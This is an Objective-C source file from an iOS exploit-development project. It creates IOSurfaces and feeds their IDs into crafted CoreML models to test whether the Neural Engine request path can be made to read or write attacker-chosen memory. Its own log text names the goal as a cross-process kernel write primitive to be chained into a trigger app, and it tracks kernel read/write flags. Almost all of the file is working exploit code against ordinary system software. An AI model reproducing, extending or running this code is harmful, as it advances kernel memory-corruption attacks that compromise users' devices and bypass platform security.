//
//  P080AneYcraft127.m — y-craft on 127 live-sid inputs. See header.
//

#import "P080AneYcraft127.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P080_BUILD   @"p080-ycraft127-v1"
#define P080_MODEL_A @"XVRC27_127in_1out"     /* read-door differential   */
#define P080_MODEL_B @"XVRC27_127inmin_1out"  /* write door: y = x_000    */
#define P080_N_IN    127u
#define P080_N_SURF  412u
#define P080_CAP_MARK 0x53535353u
#define P080_ZERO    0x00000000u
#define P080_REPS    20u
#define P080_ENGAGE_MS 1.0

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p080_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p080_iosGetID_t)(IOSurfaceRef);
typedef void *(*p080_iosBase_t)(IOSurfaceRef);
typedef size_t (*p080_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p080_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p080_surf_t;

static int g_p080_fd = -1;
static NSMutableString *g_p080_buf;

static void p080_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P080AneYcraft127 class]) {
        if (g_p080_buf) [g_p080_buf appendString:out];
        if (g_p080_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p080_fd, s, strlen(s));
                fcntl(g_p080_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface helpers

static p080_iosCreate_t  s_iosCreate;
static p080_iosGetID_t   s_iosGetID;
static p080_iosBase_t    s_iosBase;
static p080_iosAllocSz_t s_iosAllocSz;
static p080_iosLock_t    s_iosLock;
static p080_iosLock_t    s_iosUnlock;

static BOOL p080_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p080_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p080_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p080_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p080_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p080_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p080_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p080_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p080_surface_create(void) {
    CFNumberRef w = p080_cfnum(1), h = p080_cfnum(1);
    CFNumberRef bpe = p080_cfnum(4), fmt = p080_cfnum(0x42475241);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static size_t p080_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return 0;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return 0;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
    return sz;
}

/* Full scan against a staged u32 pattern; returns YES on first diff. */
static BOOL p080_surface_scan_pattern(p080_surf_t *e, const char *label, uint32_t pattern) {
    if (!e->surf) return NO;
    void *base = s_iosBase(e->surf);
    if (!base) return NO;
    size_t sz = e->allocSize;
    if (sz == 0 || sz > (16UL << 20)) return NO;
    if (s_iosLock(e->surf, 0, NULL) != KERN_SUCCESS) return NO;
    const uint8_t *b = (const uint8_t *)base;
    const uint8_t exp[4] = { (uint8_t)(pattern & 0xff), (uint8_t)((pattern >> 8) & 0xff),
                             (uint8_t)((pattern >> 16) & 0xff), (uint8_t)((pattern >> 24) & 0xff) };
    uint8_t first[16];
    memcpy(first, b, sizeof(first));
    size_t diffOff = sz;
    uint32_t diffCnt = 0;
    for (size_t k = 0; k < sz; k++) {
        if (b[k] != exp[k & 3]) { if (diffOff == sz) diffOff = k; diffCnt++; if (diffCnt >= 256) break; }
    }
    s_iosUnlock(e->surf, 0, NULL);
    if (diffOff != sz) {
        p080_log(@"  [!] %s TOUCHED sid=%u first diff at +0x%zx (>= %u bytes)",
                 label, e->sid, diffOff, diffCnt);
        p080_log(@"      first16 %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                 first[0], first[1], first[2], first[3], first[4], first[5],
                 first[6], first[7], first[8], first[9], first[10], first[11],
                 first[12], first[13], first[14], first[15]);
        return YES;
    }
    return NO;
}

static uint32_t p080_scan_all(p080_surf_t *surfs, uint32_t made, p080_surf_t *cap,
                              const char *label) {
    uint32_t hits = 0;
    for (uint32_t i = 0; i < made; i++) {
        p080_surf_t *e = &surfs[i];
        if (e == cap) continue;
        if (p080_surface_scan_pattern(e, [[NSString stringWithFormat:@"%s[%u]", label, i]
                                          UTF8String], P080_ZERO)) hits++;
        if (hits >= 8) { p080_log(@"  [!] scan aborted early (8 hits)"); break; }
    }
    if (p080_surface_scan_pattern(cap, [[NSString stringWithFormat:@"%s[cap]", label]
                                        UTF8String], P080_CAP_MARK)) hits++;
    return hits;
}

/* fp16 serial sum — mirrors what the ANE chain computes layer by layer. */
static double p080_fp16_serial_sum(const double *v, uint32_t n) {
    __fp16 acc = (__fp16)0.0f;
    for (uint32_t i = 0; i < n; i++)
        acc = (__fp16)((float)acc + (float)v[i]);
    return (double)(float)acc;
}

#pragma mark - CoreML

static NSURL *p080_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p080_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static void p080_dump_plan(NSURL *url, NSString *tag) {
    if (@available(iOS 17.4, *)) {
        MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
        cfg.computeUnits = MLComputeUnitsAll;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        __block MLComputePlan *plan = nil;
        __block NSError *planErr = nil;
        [MLComputePlan loadContentsOfURL:url
                           configuration:cfg
                       completionHandler:^(MLComputePlan *p, NSError *e) {
                           plan = p; planErr = e;
                           dispatch_semaphore_signal(sem);
                       }];
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 8 * NSEC_PER_SEC));
        if (planErr) p080_log(@"[*] %@ computePlan err=%@", tag, planErr.localizedDescription ?: @"-");
        else if (plan) p080_log(@"[*] %@ computePlan loaded (device detail in Xcode console)", tag);
        else p080_log(@"[*] %@ computePlan nil", tag);
    }
}

/* Build a 127-input provider from the live sids (x_i = sids[i]). */
static MLDictionaryFeatureProvider *p080_provider_sids(const p080_surf_t *surfs,
                                                       uint32_t nIn, NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < nIn; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) return nil;
        m[0] = @((double)surfs[i].sid);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p080_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p080_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

static void p080_finish(uint32_t made, p080_surf_t *surfs) {
    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);
    if (g_p080_fd >= 0) { fcntl(g_p080_fd, F_FULLFSYNC); close(g_p080_fd); g_p080_fd = -1; }
}

static NSString *p080_return(void) {
    NSString *ret = g_p080_buf;
    g_p080_buf = nil;
    return ret;
}

@implementation P080AneYcraft127

+ (NSString *)tap {
    g_p080_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p080_ane_ycraft127_log.txt"];
    g_p080_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p080_log(@"=== p080 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P080_BUILD);
    p080_log(@"43748 y-craft on the 127-IN models with ALL-LIVE input record sids.");
    p080_log(@"P079 lesson (espresso.net diff): INPUT COUNT drives the ANE DMA path,");
    p080_log(@"not layer count. The 127-in chain is proven engaged (P044 v28, P077).");
    p080_log(@"P077 craft-A echo (x_1=394) proved record sid == int(x_i). Feeding");
    p080_log(@"x_i = sids[i] should pass the input loop for the FIRST time (Ghidra");
    p080_log(@"bee5f818: first bad record aborts). Model A = read-door differential");
    p080_log(@"(contents 0.0 -> y==0.0 if ANE reads our surfaces). Model B = write");
    p080_log(@"door (y = MIN(sum, x_000) == x_000 == live sid; predict2 output");
    p080_log(@"record sid = prev y = OUR surface -> ANE writes into it).");
    p080_log(@"PANIC POSSIBLE: successful input-loop wiring never ran before.");
    p080_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p080"];
    if (stop) {
        p080_log(@"%@", stop);
        p080_finish(0, NULL);
        return p080_return();
    }
    p080_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p080_resolve_iosurface()) {
        p080_log(@"[-] IOSurface dlsym FAILED — abort");
        p080_log(@"=== VERDICT ===");
        p080_log(@"abort (iosurface). hasKread=NO hasKwrite=NO.");
        p080_finish(0, NULL);
        return p080_return();
    }

    /* ---- surfaces: candidates 0..made-2 are the 127 inputs; last = capture ---- */
    p080_surf_t *surfs = calloc(P080_N_SURF, sizeof(p080_surf_t));
    uint32_t made = 0;
    for (uint32_t i = 0; i < P080_N_SURF; i++) {
        IOSurfaceRef s = p080_surface_create();
        if (!s) continue;
        surfs[made].surf = s;
        surfs[made].sid = s_iosGetID(s);
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p080_log(@"[+] surfaces: %u/%u", made, P080_N_SURF);
    if (made < P080_N_IN + 2) {
        p080_log(@"[-] need >= %u surfaces — abort", P080_N_IN + 2);
        p080_log(@"=== VERDICT ===");
        p080_log(@"abort (surfaces). hasKread=NO hasKwrite=NO.");
        p080_finish(made, surfs);
        return p080_return();
    }
    p080_surf_t *cap = &surfs[made - 1];
    uint32_t nCand = made - 1;

    /* candidates staged ZERO (read-door differential base); capture staged MARK */
    uint32_t maxSid = 0;
    for (uint32_t i = 0; i < made; i++) {
        p080_surface_fill_u32(surfs[i].surf, (&surfs[i] == cap) ? P080_CAP_MARK : P080_ZERO);
        if (i < nCand && surfs[i].sid > maxSid) maxSid = surfs[i].sid;
    }
    p080_log(@"[+] capture sid_C=%u; %u candidate sids in [%u..%u] (fp16-exact %s)",
             cap->sid, nCand, surfs[0].sid, surfs[nCand - 1].sid,
             maxSid <= 2048 ? @"YES" : @"NO — sids above 2048 round in fp16");
    p080_log(@"[+] x_000 = sid %u (model-B write target = candidate 0)", surfs[0].sid);

    /* ---- load models ---- */
    NSError *err = nil;
    NSURL *urlA = p080_model_url(P080_MODEL_A);
    NSURL *urlB = p080_model_url(P080_MODEL_B);
    MLModel *modelA = p080_load(urlA, MLComputeUnitsAll, &err);
    if (!modelA) {
        p080_log(@"[-] load A FAILED: %@", err.localizedDescription ?: @"-");
        p080_log(@"=== VERDICT ===");
        p080_log(@"abort (load A). hasKread=NO hasKwrite=NO.");
        p080_finish(made, surfs);
        return p080_return();
    }
    MLModel *modelACpu = p080_load(urlA, MLComputeUnitsCPUOnly, &err);
    MLModel *modelB = p080_load(urlB, MLComputeUnitsAll, &err);
    p080_log(@"[+] A loaded (All); cpuOnly twin %@; B(%@) %@",
             modelACpu ? @"loaded" : @"FAILED", P080_MODEL_B, modelB ? @"loaded" : @"FAILED");
    p080_dump_plan(urlA, @"A");
    p080_dump_plan(urlB, @"B");

    MLDictionaryFeatureProvider *fp = p080_provider_sids(surfs, P080_N_IN, &err);
    if (!fp) {
        p080_log(@"[-] provider FAILED: %@", err.localizedDescription ?: @"-");
        p080_log(@"=== VERDICT ===");
        p080_log(@"abort (provider). hasKread=NO hasKwrite=NO.");
        p080_finish(made, surfs);
        return p080_return();
    }

    /* expected y under the client-value hypothesis (fp16 serial + double exact) */
    double xs[P080_N_IN];
    double dblSum = 0;
    for (uint32_t i = 0; i < P080_N_IN; i++) { xs[i] = (double)surfs[i].sid; dblSum += xs[i]; }
    double fp16Sum = p080_fp16_serial_sum(xs, P080_N_IN);
    p080_log(@"[+] expectations: fp16-serial-sum(sids)=%.6e  double-sum=%.6e  zero-if-surface-read",
             fp16Sum, dblSum);

    /* ---- ENGAGEMENT GATE on model A with LIVE sids: min-of-20 All vs CpuOnly ---- */
    p080_log(@"--- PHASE G: engagement gate (live sids, 128 records/predict) ---");
    double yW = NAN;
    NSTimeInterval d = 0;
    NSTimeInterval minAll = 1e9, minCpu = 1e9;
    for (uint32_t r = 0; r < P080_REPS; r++) {
        err = nil;
        yW = p080_predict(modelA, fp, &d, &err);
        if (r == 0 && err) p080_log(@"[!] W0 err: %@", err.localizedDescription ?: @"-");
        if (d < minAll) minAll = d;
    }
    if (modelACpu) {
        for (uint32_t r = 0; r < P080_REPS; r++) {
            NSTimeInterval dc = 0;
            err = nil;
            p080_predict(modelACpu, fp, &dc, &err);
            if (dc < minCpu) minCpu = dc;
        }
    }
    BOOL engaged = modelACpu && (minAll > minCpu + P080_ENGAGE_MS / 1000.0);
    p080_log(@"[*] GATE y=%@ minAll=%.2fms minCpu=%.2fms delta=%.2fms -> ANE %s",
             p080_yfmt(yW), minAll * 1000.0, minCpu * 1000.0,
             (minAll - minCpu) * 1000.0, engaged ? "ENGAGED" : "NOT ENGAGED");
    uint32_t hitsG = p080_scan_all(surfs, made, cap, "G");
    p080_log(@"[*] G scan hits=%u", hitsG);

    if (!engaged) {
        p080_log(@"=== VERDICT ===");
        p080_log(@"ANE NOT ENGAGED even with 127 inputs + live sids (minAll %.2fms vs",
                 minAll * 1000.0);
        p080_log(@"minCpu %.2fms). Contradicts the input-count driver theory — the", minCpu * 1000.0);
        p080_log(@"specialization decision needs rework. y-craft UNTESTED, not disproven.");
        p080_log(@"NEXT: MLComputePlan per-op device dump on both models; test 4/8/16-in");
        p080_log(@"models to bisect the real threshold.");
        [[P007Board shared] recordEvent:@"p080_session" kind:@"not_engaged"
                                 detail:[NSString stringWithFormat:@"minAll=%.2fms minCpu=%.2fms",
                                         minAll * 1000.0, minCpu * 1000.0]
                                 source:@"p080"];
        p080_log(@"Honesty: conversion bar untouched. hasKread=NO hasKwrite=NO.");
        p080_finish(made, surfs);
        return p080_return();
    }

    /* ---- PHASE A: read-door differential on model A ---- */
    p080_log(@"--- PHASE A: read-door differential (contents staged 0.0) ---");
    err = nil;
    double yA = p080_predict(modelA, fp, &d, &err);
    p080_log(@"[*] A1 y=%@ t=%.2fms err=%@",
             p080_yfmt(yA), d * 1000.0, err.localizedDescription ?: @"none");
    BOOL copyIntoOurs = (p080_scan_all(surfs, made, cap, "A") > 0);
    int aBranch;
    if (yA == 0.0)              aBranch = 1;   /* surface-content read  */
    else if (yA == fp16Sum)     aBranch = 2;   /* client-value fp16     */
    else if (yA == dblSum)      aBranch = 3;   /* CPU fallback (double) */
    else                        aBranch = 4;   /* other                 */
    p080_log(@"[*] A branch: %d (%@)", aBranch,
             aBranch == 1 ? @"ANE READ OUR WIRED SURFACES — READ DOOR SHAPE" :
             aBranch == 2 ? @"client copies x VALUES into ANE staging (fp16)" :
             aBranch == 3 ? @"CPU fallback (double exact) — request likely aborted" :
             @"UNEXPECTED y — inspect");
    if (copyIntoOurs)
        p080_log(@"[!] candidate surfaces TOUCHED after A — espresso copies inputs");
    p080_log(@"    INTO the fetched surfaces (staging = ours). Re-stage before B.");

    /* ---- PHASE B: write door on model B ---- */
    BOOL capHitB = NO;
    double yB1 = NAN, yB2 = NAN, yB3 = NAN;
    if (modelB) {
        if (copyIntoOurs)
            for (uint32_t i = 0; i < made; i++)
                if (&surfs[i] != cap) p080_surface_fill_u32(surfs[i].surf, P080_ZERO);

        p080_log(@"--- PHASE B: write door (y = MIN(sum,x_000) == sid %u) ---", surfs[0].sid);
        err = nil;
        yB1 = p080_predict(modelB, fp, &d, &err);
        p080_log(@"[*] B1 y=%@ t=%.2fms (expect %.6e) err=%@",
                 p080_yfmt(yB1), d * 1000.0, (double)surfs[0].sid,
                 err.localizedDescription ?: @"none");
        p080_log(@"    B1 error echo above is the OUTPUT record sid evidence (prev-y");
        p080_log(@"    state is garbage/0 on first B predict — abort expected).");
        (void)p080_scan_all(surfs, made, cap, "B1");

        /* re-stage contents in case B1 touched them; capture mark stays */
        for (uint32_t i = 0; i < made; i++)
            if (&surfs[i] != cap) p080_surface_fill_u32(surfs[i].surf, P080_ZERO);

        p080_log(@">>> B2 = WRITE-DOOR predict (output record sid = prev y = %u = OURS) <<<",
                 surfs[0].sid);
        err = nil;
        yB2 = p080_predict(modelB, fp, &d, &err);
        p080_log(@"[*] B2 y=%@ t=%.2fms err=%@",
                 p080_yfmt(yB2), d * 1000.0, err.localizedDescription ?: @"none");
        capHitB = (p080_scan_all(surfs, made, cap, "B2") > 0);

        err = nil;
        yB3 = p080_predict(modelB, fp, &d, &err);
        p080_log(@"[*] B3 y=%@ t=%.2fms (stability) err=%@",
                 p080_yfmt(yB3), d * 1000.0, err.localizedDescription ?: @"none");
        if (p080_scan_all(surfs, made, cap, "B3") > 0) capHitB = YES;
    } else {
        p080_log(@"[-] model B load FAILED — write door skipped");
    }

    /* ---- verdict ---- */
    p080_log(@"=== VERDICT ===");
    if (capHitB) {
        p080_log(@"WRITE DOOR OPEN: an OUR-surface was written through the crafted");
        p080_log(@"output record (sid = prev y = x_000 = live armed surface).");
        p080_log(@"Own-target this tap. Stage B: make the prev-y value a FOREIGN");
        p080_log(@"sid -> cross-process kernel write via ANE request path.");
        p080_log(@"Then port into Lum1na (chained trigger app).");
        [[P007Board shared] recordEvent:@"p080_session" kind:@"write_door"
                                 detail:[NSString stringWithFormat:@"x000_sid=%u", surfs[0].sid]
                                 source:@"p080"];
    } else if (aBranch == 1) {
        p080_log(@"READ DOOR SHAPE: y==0.0 with contents staged zero — the ANE read");
        p080_log(@"our wired input surfaces. Buffer-cache sid-from-record fetch");
        p080_log(@"CONFIRMED for inputs. Output record sid != prev y (B scan clean,");
        p080_log(@"B1 y=%@ vs expected %u) — hunt the output-side client fill next:",
                 p080_yfmt(yB1), surfs[0].sid);
        p080_log(@"who writes MemoryMapRequest output entry field[0] (espresso side).");
        [[P007Board shared] recordEvent:@"p080_session" kind:@"read_door"
                                 detail:@"y==0 with zero-staged contents" source:@"p080"];
    } else if (aBranch == 2) {
        p080_log(@"CLIENT-VALUE PATH: y==fp16-serial-sum(sids) — espresso copies the x");
        p080_log(@"VALUES into its own ANE staging; our surfaces were fetched but");
        p080_log(@"their CONTENT is not read. Record sid == int(x_i) confirmed again.");
        p080_log(@"y-craft via content staging is dead on the input side; the output");
        p080_log(@"record sid question remains (B1 echo). NEXT: P073-style staging-");
        p080_log(@"surface identity games or the submit-dict sid source.");
        [[P007Board shared] recordEvent:@"p080_session" kind:@"client_value_path"
                                 detail:@"y==fp16sum(sids)" source:@"p080"];
    } else {
        p080_log(@"Engaged but inconclusive. A y=%@ (fp16sum=%.6e dblsum=%.6e)",
                 p080_yfmt(yA), fp16Sum, dblSum);
        p080_log(@"B1 y=%@ B2 y=%@ capHit=%d. Read the error echoes above — they",
                 p080_yfmt(yB1), p080_yfmt(yB2), capHitB);
        p080_log(@"carry the actual record sids ('surface-Id: %%d is nullptr').");
        [[P007Board shared] recordEvent:@"p080_session" kind:@"inconclusive"
                                 detail:@"engaged no branch" source:@"p080"];
    }
    p080_log(@"Honesty: own surfaces only; foreign transfer not measured. Conversion bar");
    p080_log(@"(desc_type_forged OR (body_forged AND kptr)) untouched.");
    p080_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh boot next tap.");

    p080_finish(made, surfs);
    return p080_return();
}

@end